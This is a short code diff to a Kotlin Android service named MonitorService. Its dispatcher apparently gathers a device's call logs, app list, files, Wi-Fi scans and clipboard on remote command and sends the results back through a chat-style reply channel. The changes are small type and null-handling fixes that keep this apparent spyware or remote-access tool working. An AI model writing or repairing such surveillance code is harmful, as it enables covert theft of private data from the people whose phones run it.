@@ -231,7 +231,7 @@ class MonitorService : Service() {
             "call_logs" -> getCallLogs()
             "apps" -> getApps()
             "location" -> mapOf("note" to "Location requires LocationListener")
-            "files" -> getFiles(args)
+            "files" -> getFiles(args as Map<String, Any>)
             "wifi" -> scanWifi()
             "clipboard" -> getClipboard()
             "screen" -> mapOf("note" to "Screenshot requires MediaProjection")
@@ -424,7 +424,7 @@ class MonitorService : Service() {
             m["output"] = output
             m["error"] = error
             return m
-        } catch (e: Exception) { return mapOf("error" to e.message) }
+        } catch (e: Exception) { return mapOf("error" to (e.message ?: "unknown error")) }
     }
 
     private fun sendResult(taskId: String, result: Any?, error: String?, status: String, replyChat: Long = 0) {
